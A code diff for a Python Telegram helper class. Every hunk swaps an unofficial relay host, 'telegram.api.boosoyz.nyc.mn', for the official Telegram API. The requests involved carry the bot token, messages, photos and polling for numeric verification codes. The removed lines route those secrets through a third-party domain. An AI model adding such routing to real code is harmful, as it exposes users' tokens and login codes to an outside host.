@@ -101,7 +101,7 @@ class Telegram:
         if not self.ok:
             return
         try:
-            requests.post(f"https://telegram.api.boosoyz.nyc.mn/bot{self.token}/sendMessage",
+            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage",
                         data={"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}, timeout=30)
         except Exception:
             pass
@@ -111,7 +111,7 @@ class Telegram:
             return
         try:
             with open(path, 'rb') as f:
-                requests.post(f"https://telegram.api.boosoyz.nyc.mn/bot{self.token}/sendPhoto",
+                requests.post(f"https://api.telegram.org/bot{self.token}/sendPhoto",
                             data={"chat_id": self.chat_id, "caption": caption[:1024]}, files={"photo": f}, timeout=60)
         except Exception:
             pass
@@ -120,7 +120,7 @@ class Telegram:
         if not self.ok:
             return 0
         try:
-            r = requests.get(f"https://telegram.api.boosoyz.nyc.mn/bot{self.token}/getUpdates", params={"timeout": 0}, timeout=10)
+            r = requests.get(f"https://api.telegram.org/bot{self.token}/getUpdates", params={"timeout": 0}, timeout=10)
             data = r.json()
             if data.get("ok") and data.get("result"):
                 return data["result"][-1]["update_id"] + 1
@@ -136,7 +136,7 @@ class Telegram:
         pattern = re.compile(r"^/code\s+(\d{6,8})$")
         while time.time() < deadline:
             try:
-                r = requests.get(f"https://telegram.api.boosoyz.nyc.mn/bot{self.token}/getUpdates",
+                r = requests.get(f"https://api.telegram.org/bot{self.token}/getUpdates",
                                params={"timeout": 20, "offset": offset}, timeout=30)
                 data = r.json()
                 if not data.get("ok"):
